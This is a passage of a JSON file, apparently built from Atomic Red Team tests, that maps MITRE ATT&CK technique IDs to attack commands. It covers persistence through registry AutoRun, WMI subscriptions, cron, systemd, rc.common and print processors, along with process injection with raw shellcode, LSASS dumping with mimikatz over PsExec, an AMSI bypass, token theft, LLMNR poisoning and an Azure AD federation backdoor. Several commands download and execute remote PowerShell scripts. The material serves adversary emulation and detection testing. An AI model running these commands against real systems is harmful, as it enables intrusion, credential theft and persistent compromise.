            "description": "An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.\n[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)",
            "command": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"notepad.exe\" -PropertyType \"String\""
         },
         {
            "description": "The DLL pointed to by the AutodialDLL registry key is loaded every time a process connects to the internet. Attackers can gain persistent code execution by setting this key to a DLL of their choice. \n\nThe sample dll provided, AltWinSock2DLL, will launch the notepad process. Starting and stopping a web browser such as MS Edge or Chrome should result in the dll executing.\n[Blog](https://www.mdsec.co.uk/2022/10/autodialdlling-your-way/)\n",
            "command": "if (Test-Path PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll) { ; } else {New-Item -Type Directory \"PathToAtomicsFolder\\T1546\\bin\\\" -ErrorAction ignore | Out-Null; Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/bin/AltWinSock2DLL.dll\" -OutFile \"PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll\"};  ;  Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll"
         },
         {
            "description": "The following Atomic will create a New-CimSession on a remote endpoint and start a process usnig Invoke-CimMethod.\nThis is a novel way to perform lateral movement or to start a remote process.\nThis does require WinRM to be enabled. The account performing the run will also need to be elevated.\nA successful execution will stdout that the process started. On the remote endpoint, wmiprvse.exe will spawn the given process.\n",
            "command": " $RemoteComputer = \"localhost\";  $PWord = ConvertTo-SecureString -String \"P@ssword1\" -AsPlainText -Force;  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"Administrator\", $Pword;  $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential;  $ProcessToStart = \"calc.exe\";  $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart};  if ($Result.ReturnValue -eq 0) {;      Write-Host \"Process started successfully with Process ID: $($Result.ProcessId)\";  } else {;      Write-Host \"Failed to start the process. Error code: $($Result.ReturnValue)\";  };  Remove-CimSession -CimSession $CimSession"
         },
         {
            "description": "An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.\n[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)",
            "command": "$path = \"HKCU:\\Software\\Microsoft\\Command Processor\"; if (!(Test-Path -path $path)){;   New-Item -ItemType Key -Path $path; }; New-ItemProperty -Path $path -Name \"AutoRun\" -Value \"notepad.exe\" -PropertyType \"String\""
         }
      ]
   },
   "T1546.003": {
      "technique_name": "Event Triggered Execution: Windows Management Instrumentation Event Subscription",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Run from an administrator powershell window. After running, reboot the victim machine.\nAfter it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af\n\nhttps://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545\n",
            "command": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';                 EventNameSpace='root\\CimV2';                 QueryLanguage=\"WQL\";                 Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"}; $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs; $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';                 CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\notepad.exe\";}; $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs; $FilterToConsumerArgs = @{; Filter = [Ref] $Filter; Consumer = [Ref] $Consumer; }; $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs"
         },
         {
            "description": "Run from an administrator powershell window. After running, reboot the victim machine.\nAfter it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mgreen27/ef726db0baac5623dc7f76bfa0fc494c\n",
            "command": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';                 EventNameSpace='root\\CimV2';                 QueryLanguage=\"WQL\";                 Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"}; $Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments $FilterArgs; $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';                 ScriptingEngine='VBScript';                 ScriptText=';                 Set objws = CreateObject(\"Wscript.Shell\");                 objws.Run \"notepad.exe\", 0, True;                 '}; $Consumer=Set-WmiInstance -Namespace \"root\\subscription\" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs; $FilterToConsumerArgs = @{; Filter = $Filter; Consumer = $Consumer; }; $FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs"
         },
         {
            "description": "The following Atomic will utilize MOFComp.exe to load a local MOF file.\nThe Managed Object Format (MOF) compiler parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository. \nTo query for the class:  gwmi __eventfilter -namespace root\\subscription\nA successful execution will add the class to WMI root namespace.\nReference: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/.\n",
            "command": "c:\\windows\\system32\\wbem\\mofcomp.exe \"715d8f_T1546.003.mof\""
         }
      ]
   },
   "T1055": {
      "technique_name": "Process Injection",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).\nEspecially useful against domain controllers in Active Directory environments.\nIt must be executed in the context of a user who is privileged on remote `machine`.\n\nThe effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" /accepteula \\\\DC1 -c %tmp%\\mimikatz\\x64\\mimikatz.exe \"lsadump::lsa /inject /id:500\" \"exit\""
         },
         {
            "description": "This module injects shellcode into a newly created process and executes. By default the shellcode is created,\nwith Metasploit, for use on x86-64 Windows 10 machines.\n\nNote: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office\nis required.\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"40c65d_T1055-macrocode.txt\" -officeProduct \"Word\" -sub \"Execute\""
         },
         {
            "description": "This test used the Windows undocumented remote-fork API RtlCreateProcessReflection to create a cloned process of the parent process\nwith shellcode written in its memory. The shellcode is executed after being forked to the child process. The technique was first presented at \nBlackHat Europe 2022. Shellcode will open a messsage box and a notepad.\n",
            "command": "Start-Process \"C:\\Users\\puma-4\\Desktop\\redVanity.exe\" (Start-Process calc.exe -PassThru).Id"
         },
         {
            "description": "This test creates a section object in the local process followed by a local section view.\nThe shellcode is copied into the local section view and a remote section view is created in the target process, pointing to the local section view. \nA thread is then created in the target process, using the remote section view as start address.\n",
            "command": "$notepad = Start-Process notepad -passthru; Start-Process \"C:\\Users\\puma-4\\Desktop\\InjectView.exe\""
         },
         {
            "description": "Start a new calculator process",
            "command": "0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3"
         }
      ]
   },
   "T1543.002": {
      "technique_name": "Create or Modify System Process: Systemd Service",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "This test creates a systemd service unit file and enables it to autostart on boot. Once service is created and enabled, it also modifies this same service file showcasing both Creation and Modification of system process. \n",
            "command": "if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ] || [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then : ; else echo Please run from Ubuntu ,Kali OR CentOS.; fi;  ;  cat > /etc/init.d/T1543.002 << EOF; python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK'))\"; EOF; chmod +x /etc/init.d/T1543.002; if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then chkconfig T1543.002 on ; else echo \"Please run this test on Ubnutu , kali OR centos\" ; fi ; systemctl enable T1543.002; systemctl start T1543.002; echo \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\\\"\" | sudo tee -a /etc/init.d/T1543.002; systemctl daemon-reload; systemctl restart T1543.002"
         },
         {
            "description": "This test creates a Systemd service unit file and enables it as a service.\n",
            "command": "echo \"[Unit]\" > /etc/systemd/system/art-systemd-service.service; echo \"Description=Atomic Red Team Systemd Service\" >> /etc/systemd/system/art-systemd-service.service; echo \"\" >> /etc/systemd/system/art-systemd-service.service; echo \"[Service]\" >> /etc/systemd/system/art-systemd-service.service; echo \"Type=simple\"; echo \"ExecStart=/bin/touch /tmp/art-systemd-execstart-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"ExecStartPre=/bin/touch /tmp/art-systemd-execstartpre-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"ExecStartPost=/bin/touch /tmp/art-systemd-execstartpost-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"ExecReload=/bin/touch /tmp/art-systemd-execreload-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"ExecStop=/bin/touch /tmp/art-systemd-execstop-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"ExecStopPost=/bin/touch /tmp/art-systemd-execstoppost-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"\" >> /etc/systemd/system/art-systemd-service.service; echo \"[Install]\" >> /etc/systemd/system/art-systemd-service.service; echo \"WantedBy=default.target\" >> /etc/systemd/system/art-systemd-service.service; systemctl daemon-reload; systemctl enable art-systemd-service.service; systemctl start art-systemd-service.service"
         }
      ]
   },
   "T1557.001": {
      "technique_name": "Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Inveigh conducts spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. This Atomic will run continuously until you cancel it or it times out.",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1\" -UseBasicParsing); Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y"
         }
      ]
   },
   "T1484.002": {
      "technique_name": "Domain Trust Modification",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Add a new federated domain to Azure AD using PowerShell.\nThe malicious domain to be federated must be configured beforehand (outside of the scope of this test):\n    1. Open Azure Portal\n    2. Add a new \"custom domain name\"\n    3. Verify the domain by following instructions (i.e. create the requested DNS record)\n",
            "command": "Import-Module AzureAD; Import-Module AADInternals; $PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contosocloud.com\", $Pword; try {;   Connect-AzureAD -Credential $Credential -ErrorAction Stop > $null; }; catch {;   Write-Host \"Error: AzureAD could not connect\";   exit 1; }; try {;   $domain = Get-AzureADDomain -Name \"contoso.com\"; }; catch {;   Write-Host \"Error: domain \"\"contoso.com\"\" not found\";   exit 1; }; if (-Not $domain.IsVerified) {;   Write-Host \"Error: domain \"\"contoso.com\"\" not verified\";   exit 1; }; if ($domain.AuthenticationType -eq \"Federated\") {;   Write-Host \"Error: domain \"\"contoso.com\"\" already federated. Try with a different domain or re-create it before.\";   exit 1; }; $at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential; if (-Not $at) {;   Write-Host \"Error: AADInternals could not connect\";   exit 1; }; $new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName \"contoso.com\"; if ($new) {;   Write-Host \"Federation successfully added to Azure AD\";   Write-Host $new; }; else {;   Write-Host \"The federation setup failed\"; }; Write-Host \"End of federation configuration.\""
         }
      ]
   },
   "T1134.002": {
      "technique_name": "Create Process with Token",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "This Action demonstrates how an access token for a specific program can spawn another program under a different owner. \nAdversaries can leverage access tokens to run programs under a different user not only to achieve privilege escalation but also to evade detection by blending in with normal user activity. \nThis Action will query all processes and list the process name and owner.It will then make a copy of an existing token to create a new instance of cmd.exe\n",
            "command": "Set-ExecutionPolicy -Scope Process Bypass -Force; $owners = @{}; gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}; Get-Process | Select ProcessName,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}}; & \"C:\\Users\\puma-4\\Desktop\\GetToken.ps1\"; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,\"cmd.exe\")"
         },
         {
            "description": "Get SYSTEM shell - Pop System Shell using Token Manipulation technique via function of WinPwn",
            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem"
         }
      ]
   },
   "T1546.005": {
      "technique_name": "Event Triggered Execution: Trap",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Launch bash shell with command arg to create TRAP on SIGINT (CTRL+C), then send SIGINT signal.\nThe trap executes script that writes to /tmp/art-fish.txt\n",
            "command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" SIGINT && kill -SIGINT $$'"
         },
         {
            "description": "Launch bash shell with command arg to create TRAP on EXIT.\nThe trap executes script that writes to /tmp/art-fish.txt\n",
            "command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" EXIT'"
         }
      ]
   },
   "T1053.003": {
      "technique_name": "Scheduled Task/Job: Cron",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "This test replaces the current user's crontab file with the contents of the referenced file. This technique was used by numerous IoT automated exploitation attacks.\n",
            "command": "crontab -l > /tmp/notevil; echo \"* * * * * /tmp/evil.sh\" > /tmp/persistevil && crontab /tmp/persistevil"
         },
         {
            "description": "This test adds a script to a /var/spool/cron/crontabs folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.\n",
            "command": "echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" >> /var/spool/cron/crontabs/persistevil"
         },
         {
            "description": "This test adds a script to /etc/cron.hourly, /etc/cron.daily, /etc/cron.monthly and /etc/cron.weekly folders configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.\n",
            "command": "echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.daily/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.hourly/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.monthly/persistevil; echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.weekly/persistevil"
         }
      ]
   },
   "T1053.002": {
      "technique_name": "Scheduled Task/Job: At",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Executes cmd.exe\nNote: deprecated in Windows 8+\n\nUpon successful execution, cmd.exe will spawn at.exe and create a scheduled task that will spawn cmd at a specific time.\n",
            "command": "at 13:20 /interactive cmd"
         },
         {
            "description": "This test submits a command to be run in the future by the `at` daemon.\n",
            "command": "echo \"echo Hello from Atomic Red Team\" | at now + 1 minute"
         }
      ]
   },
   "T1547": {
      "technique_name": "Boot or Logon Autostart Execution",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Install a driver via pnputil.exe lolbin\n",
            "command": "pnputil.exe /add-driver \"C:\\Windows\\INF\\usbstor.inf\""
         }
      ]
   },
   "T1547.012": {
      "technique_name": "Boot or Logon Autostart Execution: Print Processors",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Establishes persistence by creating a new print processor registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors.\nThe new print processor will point to a DLL which will be loaded by the spooler service after a reboot. The DLL will then create the file AtomicTest.txt in C:\\Users\\Public\\ as validation that the test is successful.\n\nNote: The test assumes a x64 Windows operating system.\n\nThe payload source code is based on a blog post by stmxcsr: [https://stmxcsr.com/persistence/print-processor.html](https://stmxcsr.com/persistence/print-processor.html)\n",
            "command": "if( $(get-service -Name spooler).StartType -eq \"Disabled\") {Set-Service -Name \"spooler\" -StartupType Automatic}; net stop spooler; Copy-Item \"C:\\Users\\puma-4\\Desktop\\AtomicTest.dll\" C:\\Windows\\System32\\spool\\prtprocs\\x64\\AtomicTest.dll; reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\AtomicRedTeam\" /v \"Driver\" /d \"AtomicTest.dll\" /t REG_SZ /f; net start spooler;"
         }
      ]
   },
   "T1574.001": {
      "technique_name": "Hijack Execution Flow: DLL Search Order Hijacking",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)\nhttps://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/\n\nUpon successful execution, powershell.exe will be copied and renamed to updater.exe and load amsi.dll from a non-standard path.\n",
            "command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe && copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll && %APPDATA%\\updater.exe -Command exit"
         }
      ]
   },
   "T1546.009": {
      "technique_name": "Event Triggered Execution: AppCert DLLs",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Creates a new 'AtomicTest' value pointing to an AppCert DLL in the AppCertDlls registry key. \nOnce the computer restarted, the DLL will be loaded in multiple processes and write an \n'AtomicTest.txt' file in C:\\Users\\Public\\ to validate that the DLL executed succesfully.\n\nReference: https://skanthak.homepage.t-online.de/appcert.html\n",
            "command": "Copy-Item \"7e8ee7_AtomicTest.dll\" C:\\Users\\Public\\AtomicTest.dll -Force; reg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v \"AtomicTest\" /t REG_EXPAND_SZ /d \"C:\\Users\\Public\\AtomicTest.dll\" /f; if($false){Restart-Computer}"
         }
      ]
   },
   "T1574.011": {
      "technique_name": "Hijack Execution Flow: Services Registry Permissions Weakness",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Service registry permissions weakness check and then which can lead to privilege escalation with ImagePath. eg.\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\" /f /v ImagePath /d \"C:\\temp\\AtomicRedteam.exe\"\n",
            "command": "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* |FL; get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\weakservicename |FL"
         },
         {
            "description": "Change Service registry ImagePath of a bengin service to a malicious file\n",
            "command": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\calcservice\" /f /v ImagePath /d \"%windir%\\system32\\cmd.exe\""
         }
      ]
   },
   "T1037.004": {
      "technique_name": "Boot or Logon Initialization Scripts: Rc.common",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Modify rc.common\n\n[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html)\n",
            "command": "sudo echo osascript -e 'tell app \"Finder\" to display dialog \"Hello World\"' >> /etc/rc.common"
         },
         {
            "description": "Modify rc.common\n",
            "command": "filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi; printf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.common; echo \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\\\"\" | sudo tee -a /etc/rc.common; printf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.common; sudo chmod +x /etc/rc.common"
         },
         {
            "description": "Modify rc.local\n",
            "command": "filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi; printf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.local; echo \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\\\"\" | sudo tee -a /etc/rc.local; printf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.local; sudo chmod +x /etc/rc.local"
         }
      ]
   }
}